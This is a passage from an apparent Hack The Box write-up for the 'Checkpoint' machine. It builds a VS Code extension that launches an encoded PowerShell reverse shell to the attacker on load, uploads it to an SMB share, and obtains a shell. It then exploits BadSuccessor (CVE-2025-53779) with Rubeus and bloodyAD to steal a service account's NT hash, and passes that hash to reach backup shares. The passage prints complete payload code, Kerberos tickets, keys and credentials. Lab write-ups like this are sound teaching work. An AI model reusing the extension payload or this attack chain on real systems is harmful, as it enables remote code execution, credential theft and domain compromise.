  - `"activationEvents"`: Specifies events that trigger the extension. We use wildcard `["*"]` to force immediate activation upon VS Code startup or package installation, bypassing standard user interaction triggers.
  - `"main"`: Specifies the entrypoint script file (`extension.js`) containing the activation lifecycle hooks.
- **`extension.js`**: Contains the runtime code. It exports lifecycle functions:
  - `activate(context)`: Executed when the activation event occurs. We place our reverse shell execution code here.
  - `deactivate()`: Executed when the extension is disabled.
  - **Payload Encoding**: The PowerShell TCP reverse shell payload is Base64 encoded as UTF-16LE. This bypasses potential syntax/escaping issues with special characters (such as double quotes, ampersands, and pipes) during process execution on the Windows host.
- **`[Content_Types].xml`**: Maps file extensions within the ZIP archive to their respective MIME content types (e.g. `application/json` and `application/javascript`), allowing the VSIX package installer to parse files correctly.
- **`extension.vsixmanifest`**: The primary OPC packaging manifest. It defines installer metadata, target platforms (VS Code), and tells the package loader where files like `package.json` and `extension.js` reside inside the archive.

We create the project files manually:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ mkdir minimal-ext && cd minimal-ext
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ # Create package.json
cat > package.json << 'EOF'
{
  "name": "evil",
  "displayName": "Evil",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "extension.js"
}
EOF
```

Next, we write the payload in `extension.js`. The activation function executes a Base64-encoded UTF-16LE PowerShell reverse TCP client when the extension loads:

``` shell                                                                                                                                                
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ cat << 'EOF' > extension.js       
const cp = require('child_process');

function activate(context) {
    console.log('Extension "code" is now active!');

    // REPLACE <YOUR_IP> and <YOUR_PORT> with your listener details
    const payload = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.224",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';

    const encoded = Buffer.from(payload, 'utf16le').toString('base64');
    cp.exec('powershell -e ' + encoded);
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};
EOF
```

We establish the layout required for a valid extension installation:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ mkdir -p extension
cp extension.js extension/
cp package.json extension/
```

We define the Open Packaging Convention content types schema `[Content_Types].xml`:

```shell                                                                                                                                               
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ cat > [Content_Types].xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json" />
  <Default Extension="js" ContentType="application/javascript" />
</Types>
EOF     
```                                                                                                                                                 

We write the XML deployment manifest `extension.vsixmanifest`:

```shell                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ cat > extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx/2010">
  <Metadata>
    <Identity Id="evil" Version="1.0.0" Publisher="test" />
    <DisplayName>Evil</DisplayName>
  </Metadata>
  <Installation>
    <InstallationTarget Id="Microsoft.VisualStudio.Code" Version="[1.118.0,)" />
  </Installation>
  <Assets>
    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" />
    <Asset Type="Microsoft.VisualStudio.Code.Extension" Path="extension/extension.js" />
  </Assets>
</PackageManifest>
EOF
```   

We package the structure into `evil.vsix`:

```shell                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ zip -r evil.vsix [Content_Types].xml extension.vsixmanifest extension/ 
  adding: [Content_Types].xml (deflated 37%)
  adding: extension.vsixmanifest (deflated 49%)
  adding: extension/ (stored 0%)
  adding: extension/package.json (deflated 25%)
  adding: extension/extension.js (deflated 40%)    
```

### Upload and Reverse Shell Execution

We initiate a local TCP port listener using `penelope` (an advanced shell handler supporting auto-reconnection and interactive TTY upgrades) and upload the crafted `.vsix` extension to the `DevDrop` share using `smbclient`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ smbclient '//DC01.checkpoint.htb/DevDrop' -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c 'put evil.vsix evil.vsix'
putting file evil.vsix as \evil.vsix (2.4 kB/s) (average 2.4 kB/s)
```

The backend server automatically processes the package, executing our payload and triggering a callback to the shell listener:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ penelope -p 4444 -i tun0                                                     
[+] Listening for reverse shells on 10.10.14.224:4444 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => DC01 10.129.36.165 Microsoft_Windows_Server_2025_Standard-x64-based_PC 👤 checkpoint\ryan.brooks 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/DC01~10.129.36.165-Microsoft_Windows_Server_2025_Standard-x64-based_PC/2026_06_24-17_39_04-926.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> cat C:\Users\ryan.brooks\Desktop\user.txt
****************fedf525e6348a497d
```

We establish a shell running as `checkpoint\ryan.brooks` and retrieve the user flag.

---

## 5. Privilege Escalation: BadSuccessor (CVE-2025-53779)

### System and Vulnerability Analysis

With local access established, we query the exact Windows Server build and version info:

```shell
PS C:\Program Files\Microsoft VS Code> Get-ComputerInfo | Select-Object WindowsVersion, WindowsBuildLabEx, OsName, OsVersion, OsArchitecture

WindowsVersion    : 2009
WindowsBuildLabEx : 26100.1.amd64fre.ge_release.240331-1435
OsName            : Microsoft Windows Server 2025 Standard
OsVersion         : 10.0.26100
OsArchitecture    : 64-bit
```

The Domain Controller is running **Windows Server 2025 Standard (Build 26100.1)**. 

#### Understanding BadSuccessor (CVE-2025-53779)
BadSuccessor is a critical vulnerability affecting Active Directory environments running at least one Windows Server 2025 Domain Controller. It targets **delegated Managed Service Accounts (dMSAs)**, which were introduced in Server 2025 to enable managed credentials for service accounts.

- **The Flaw**: To migrate legacy service accounts, a dMSA is configured to inherit permissions from a predecessor account. The Kerberos Key Distribution Center (KDC) reads a single attribute `msDS-ManagedAccountPrecededByLink` on the dMSA to identify its predecessor. 
- **The Exploit**: Prior to Microsoft's security updates, the KDC did not validate mutual authentication links (i.e. verifying that the predecessor account also authorized the link). An attacker with permissions to create a dMSA in an OU could create one and set its `msDS-ManagedAccountPrecededByLink` to point to a high-privileged target account (such as a Domain Admin or service account). The attacker then authenticates as the dMSA and obtains a Kerberos ticket containing the full privileges and decryption keys of the target account.

We check if the patching hotfix `KB5063878` is installed:

```
PS C:\Program Files\Microsoft VS Code> Get-HotFix | Where-Object {$_.HotFixID -eq "KB5063878"}
PS C:\Program Files\Microsoft VS Code>
```

No hotfix is returned, confirming that the DC is vulnerable.

```
PS C:\Program Files\Microsoft VS Code> systeminfo

Host Name:                     DC01
OS Name:                       Microsoft Windows Server 2025 Standard
OS Version:                    10.0.26100 N/A Build 26100
OS Manufacturer:               Microsoft Corporation
OS Configuration:              Primary Domain Controller
OS Build Type:                 Multiprocessor Free
Registered Owner:              N/A
Registered Organization:       N/A
Product ID:                    00493-00000-24846-AA789
Original Install Date:         5/9/2026, 12:26:57 AM
System Boot Time:              6/24/2026, 12:32:34 PM
System Manufacturer:           VMware, Inc.
System Model:                  VMware Virtual Platform
System Type:                   x64-based PC
Processor(s):                  1 Processor(s) Installed.
                               [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:                  Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:             C:\WINDOWS
System Directory:              C:\WINDOWS\system32
....
....
```

- **Vulnerability Summary**:
  - **CVE ID**: CVE-2025-53779
  - **Vulnerability Name**: BadSuccessor (Kerberos Privilege Escalation)
  - **Affected Systems**: Windows Server 2025 Active Directory domains with unpatched DCs
  - **Remediation Hotfix**: KB5063878 (Build 26100.4946 or later)
  - **Remediation Release Date**: August 12, 2025

### Checking Domain Eligibility & Permissions

To exploit BadSuccessor, we need:
- **`CreateChild`** permissions over an OU to create the dMSA.
- **`WriteProperty`** (or `genericWrite`) on a target account to set the link.

We use NetExec with the `badsuccessor` module to check configuration details:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ netexec ldap $ip -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
LDAP        10.129.36.165   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.36.165   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
BADSUCCE... 10.129.36.165   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.36.165 (DC01.checkpoint.htb)
BADSUCCE... 10.129.36.165   389    DC01             [+] Found 2 results
BADSUCCE... 10.129.36.165   389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.36.165   389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb              
```

`ryan.brooks` has permissions targeting `OU=DMSAHolder,DC=checkpoint,DC=htb`. We configure a local SMB server to host Akamai's `Get-BadSuccessorOUPermissions.ps1` audit script:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint/minimal-ext]
└─$ impacket-smbserver share /home/kali/Checkpoint -smb2support -user test -password test123 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```

From our reverse shell, we mount the share, transfer the auditing script, and execute it:

```
PS C:\Program Files\Microsoft VS Code> cd C:\Programdata
PS C:\Programdata> net use Z: \\10.10.14.224\share /user:test test123
The command completed successfully.

PS C:\Programdata> copy Z:\Get-BadSuccessorOUPermissions.ps1 C:\ProgramData\Get-BadSuccessorOUPermissions.ps1
PS C:\Programdata> . .\Get-BadSuccessorOUPermissions.ps1
PS C:\Programdata> Get-BadSuccessorOUPermissions

Identity               OUs                                 
--------               ---                                 
CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}
CHECKPOINT\alex.turner {OU=Employees,DC=checkpoint,DC=htb} 
```

`ryan.brooks` has permissions to create child objects in `OU=DMSAHolder,DC=checkpoint,DC=htb`. Since `ryan.brooks` also has `genericWrite` access over `svc_deploy`, we can proceed with the exploit.

### Abuse Path: BadSuccessor Privilege Escalation (dMSA Impersonation)
The dMSA privilege escalation abuse path proceeds as follows:
1. **Targeting Permissions**: Identify an OU where the attacker has `CreateChild` rights to create service accounts (e.g. `OU=DMSAHolder`), and a target user account over which they have `WriteProperty` / `GenericWrite` permissions (e.g. `svc_deploy`).
2. **dMSA Creation**: The attacker issues an LDAP request to create a dMSA object (`bad-dmsa$`) in the writable OU.
3. **One-Way Mapping Creation**: The attacker sets the `msDS-ManagedAccountPrecededByLink` attribute of the dMSA to point to the distinguished name of `svc_deploy`.
4. **Kerberos Ticket Request**: When the attacker requests a Kerberos Ticket Granting Ticket (TGT) for the dMSA (`bad-dmsa$`), the unpatched KDC processes the predecessor link one-way. It packages the authorization data, groups, and cryptographic NT keys of the predecessor account (`svc_deploy`) directly into the TGT issued to the dMSA.
5. **Credential Extraction**: The attacker extracts the issued TGT, revealing the underlying NT hash/session keys of the target account, effectively taking it over.

To perform the exploit, we require the Kerberos Ticket Granting Ticket (TGT) for `ryan.brooks`. We copy `Rubeus.exe` (a C# toolset for raw Kerberos interaction and abuse) to the machine and run the `tgtdeleg` command to extract the TGT from memory:

```
PS C:\Programdata> copy Z:\Rubeus.exe C:\ProgramData\Rubeus.exe

PS C:\Programdata> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: rY9Iv3yhaQJhxSlSFu5o2/cdM5I/hPHUSwRYVkhpBzE=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRujXAGcvjLBKeckn4gTnYQyIG9ftF4E8U2j4PlvojRB5wjuJsc3yR0W/JlL/MMy1cyggzJQAVaX2U9vDSd7IQY7bn95Izo+l8CeSGvb4Ow/Qw6k3kKaKNIMZk5LaRMIP7Nbug4UsFP6XH3TcXsFa9Ydv7YAG+N/gT847KKRnUqDMs/pwhkneF9HNCippF27hRQXZyll1MQuWqaelwDSTw1zN9PaL7ZY3POTJfbFjh0hGW3z0GdkkTwlWgrtudEPji7MbAozYMcXYWN/hx3GavkHSjLc4gTzW2VI1Uw6elpwG73rozKD5Ba8EUckBL7UHEwletd/+jnvTXj9lLw+ZQYq8nosWa+vfqaBhSpxO6YN/uCCpahc0qaf5n45++YNhaSPWY8ZS0CrE+Pg7i72fsgyvRJ3Bt31qbni1rnJPRF1Ks2WniVL0kb7U/g6ap0vY2mAGIf0waX0kQR2Pgj7k7MvtjZ//I2kfWzP/YftnWMMD0VQ6eiixVzwDKW1CUjidazKxz3Yf2WjXcAUhZ4AbF6OKW+lXJ/4wFSEreXKCjvOIthnL2X64f9NE7Vkwe5B79386xCyg286ZGS3ct7U/XLf+v4UwZz0d0zwX51PFXWEqqSlmxpn4YmCMAIAncpHT2j9sG7QjSQ7V0ZmRVoFXNM+oDqua7Shfl3WlttZ3aGaWbyAe7Z0kTIGioNZ8oJAbF9DTDP8yR+jGoQuajfzIRHMz9uoRpebVg9YnbLWqcIKCmFxhQltO3DW3ZocxWHbCEsz0tPPV09RMpgfru9V4XhYVbqzVZok3ocp4FX6EwswZwHS62RnyKHg5LYenKdxBZJ2y7AbDNl1N7/cHu1b3k9mrCukjt4dVeWeke1cjUxiRbYixBNSfiTGxMRJH1eilFvAP0h5hzZpEXa6nfOPaeJ/O58y4pD7+jaPqzA6+OB8VPFROqXZZEyQ4F+mvzlVsRWCWOyqGjBWf7cOOAW43AYcxKCUmnp/S1A05UXnd3O8rXu568z5/tY0OC4Odzq3sITaLm1fd6Mv0P5FHOdpZJNLhckDUMtUzyvgVpeNWsRoAmI5cuJ/TEAwgKe0DZV3pUgAiH1j39u+UXkAuYjpUcFcnePQOpbuxC82MrRTubcFYs8ndQJWHoI0hUwnXYQWTETc3o8xi3guVMFrdoibKNboQGu0JW72h2pi6Agdmx0erD3xXm2qKvYncTauMT4W4kRXgFpejsWI3VsNzCrAXNTmiu2HbheAOWYFU9mQ/hBMrI7Ht/F/OxOHadSTrWpOYrDabMBoKbmL81l30f2GfZ00T/WhYwlU6DJSICCZod+JVZZSXb/cOKZyKJ5zjmpRaWM1tt1vMVYZFqpHDo6rrKQjhg5LNGG7UGuFpNj7cdWRcJTOVzB852ZAx1yD2bkKElhOwNSXXF0Kjb1KxweZk8zLthBKyPqQP1XiguO3ZxDc/GJ4yNFhkEIZt6KtR3cgTDVHTr9xrxtj95eMCqDDd5D0no6I5hiGefAMFDYou9Oo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgThCgS32BR8Panw0G2uJvOpfVWOSUjf+IPoQKZ+gJpw2hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyNDIxMTYzNFqmERgPMjAyNjA2MjUwNzE2MzRapxEYDzIwMjYwNzAxMjExNjM0WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

#### Understanding the AP-REQ Delegation Ticket
The ticket is retrieved using Kerberos AP-REQ delegation. The ticket is initially formatted as a raw Kirbi object. We decode it, convert the ticket file into a CCACHE format usable by Linux utilities, and invoke `bloodyAD`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ echo -n 'doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRujXAGcvjLBKeckn4gTnYQyIG9ftF4E8U2j4PlvojRB5wjuJsc3yR0W/JlL/MMy1cyggzJQAVaX2U9vDSd7IQY7bn95Izo+l8CeSGvb4Ow/Qw6k3kKaKNIMZk5LaRMIP7Nbug4UsFP6XH3TcXsFa9Ydv7YAG+N/gT847KKRnUqDMs/pwhkneF9HNCippF27hRQXZyll1MQuWqaelwDSTw1zN9PaL7ZY3POTJfbFjh0hGW3z0GdkkTwlWgrtudEPji7MbAozYMcXYWN/hx3GavkHSjLc4gTzW2VI1Uw6elpwG73rozKD5Ba8EUckBL7UHEwletd/+jnvTXj9lLw+ZQYq8nosWa+vfqaBhSpxO6YN/uCCpahc0qaf5n45++YNhaSPWY8ZS0CrE+Pg7i72fsgyvRJ3Bt31qbni1rnJPRF1Ks2WniVL0kb7U/g6ap0vY2mAGIf0waX0kQR2Pgj7k7MvtjZ//I2kfWzP/YftnWMMD0VQ6eiixVzwDKW1CUjidazKxz3Yf2WjXcAUhZ4AbF6OKW+lXJ/4wFSEreXKCjvOIthnL2X64f9NE7Vkwe5B79386xCyg286ZGS3ct7U/XLf+v4UwZz0d0zwX51PFXWEqqSlmxpn4YmCMAIAncpHT2j9sG7QjSQ7V0ZmRVoFXNM+oDqua7Shfl3WlttZ3aGaWbyAe7Z0kTIGioNZ8oJAbF9DTDP8yR+jGoQuajfzIRHMz9uoRpebVg9YnbLWqcIKCmFxhQltO3DW3ZocxWHbCEsz0tPPV09RMpgfru9V4XhYVbqzVZok3ocp4FX6EwswZwHS62RnyKHg5LYenKdxBZJ2y7AbDNl1N7/cHu1b3k9mrCukjt4dVeWeke1cjUxiRbYixBNSfiTGxMRJH1eilFvAP0h5hzZpEXa6nfOPaeJ/O58y4pD7+jaPqzA6+OB8VPFROqXZZEyQ4F+mvzlVsRWCWOyqGjBWf7cOOAW43AYcxKCUmnp/S1A05UXnd3O8rXu568z5/tY0OC4Odzq3sITaLm1fd6Mv0P5FHOdpZJNLhckDUMtUzyvgVpeNWsRoAmI5cuJ/TEAwgKe0DZV3pUgAiH1j39u+UXkAuYjpUcFcnePQOpbuxC82MrRTubcFYs8ndQJWHoI0hUwnXYQWTETc3o8xi3guVMFrdoibKNboQGu0JW72h2pi6Agdmx0erD3xXm2qKvYncTauMT4W4kRXgFpejsWI3VsNzCrAXNTmiu2HbheAOWYFU9mQ/hBMrI7Ht/F/OxOHadSTrWpOYrDabMBoKbmL81l30f2GfZ00T/WhYwlU6DJSICCZod+JVZZSXb/cOKZyKJ5zjmpRaWM1tt1vMVYZFqpHDo6rrKQjhg5LNGG7UGuFpNj7cdWRcJTOVzB852ZAx1yD2bkKElhOwNSXXF0Kjb1KxweZk8zLthBKyPqQP1XiguO3ZxDc/GJ4yNFhkEIZt6KtR3cgTDVHTr9xrxtj95eMCqDDd5D0no6I5hiGefAMFDYou9Oo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgThCgS32BR8Panw0G2uJvOpfVWOSUjf+IPoQKZ+gJpw2hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyNDIxMTYzNFqmERgPMjAyNjA2MjUwNzE2MzRapxEYDzIwMjYwNzAxMjExNjM0WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=' | base64 -d > ticket.kirbi
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ impacket-ticketConverter ticket.kirbi ryan.brooks.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

We exploit the BadSuccessor vulnerability. We use `bloodyAD` to create a dMSA called `bad-dmsa$` inside `OU=DMSAHolder` and link it to the predecessor account `svc_deploy`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ KRB5CCNAME=ryan.brooks.ccache faketime -f "@$(ntpdate -q $ip | cut -d ' ' -f 1,2)" bloodyad -u ryan.brooks -k -d checkpoint.htb -i $ip --host DC01.checkpoint.htb add badsuccessor bad-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'
[+] Creating DMSA bad-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : bad-dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-24 21:34:07+00:00
EndTime      : 2026-06-25 07:16:34+00:00
RenewTill    : 2026-07-01 21:16:34+00:00
Flags        : renewable, pre-authent, enc-pa-rep, forwardable, forwarded
Keytype      : 18
Key          : w16xsnHdrSqDf+GwrGkJGQM3suVggvjiEU55yvOlfH8=
EncodedKirbi : 

    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
    Qg==
[+] dMSA TGT stored in ccache file bad-dmsa_1p.ccache

dMSA current keys found in TGS:
AES256: b7022de8181a15ca58f7428064117a8a285ab8f9102438b27cf2d4dbfedc80f6
AES128: c3c392f4247fc820fd71ca59b15dc2e4
RC4: 64c14eaf428c6d9169bb87390b803eb4

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

When issuing a Kerberos ticket for the newly created dMSA (`bad-dmsa$`), the KDC returns the predecessor keys for the account it is linked to (`svc_deploy`). We retrieve the RC4 hash (NT hash) for `svc_deploy`: `e16081eb077aca74bdbf8af12af43ac9`.

---

## 6. Offline Memory Forensics & Domain Takeover

We verify the extracted NT hash for `svc_deploy` by authenticating to the domain controller over SMB:

```shell
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
SMB         10.129.36.165   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.165   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
```

### Share Access & File Retrieval

We query the SMB shares accessible to `svc_deploy`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
SMB         10.129.36.165   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.165   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
SMB         10.129.36.165   445    DC01             [*] Enumerated shares
SMB         10.129.36.165   445    DC01             Share           Permissions     Remark
SMB         10.129.36.165   445    DC01             -----           -----------     ------
SMB         10.129.36.165   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.36.165   445    DC01             C$                              Default share
SMB         10.129.36.165   445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                                                                   
SMB         10.129.36.165   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.36.165   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.36.165   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.36.165   445    DC01             VMBackups       READ            
```

`svc_deploy` has **READ** permissions over the `VMBackups` share. We connect to the share using `smbclient` with the NT hash to list its contents:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ smbclient '//DC01.checkpoint.htb/VMBackups' -U 'checkpoint.htb/svc_deploy' --pw-nt-hash 'e16081eb077aca74bdbf8af12af43ac9'
Try "help" to get a list of possible commands.
smb: \> cd NightlyBackup_2024-11-01\memory forensics\
cd \NightlyBackup_2024-11-01\memory\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd "NightlyBackup_2024-11-01\memory forensics\"
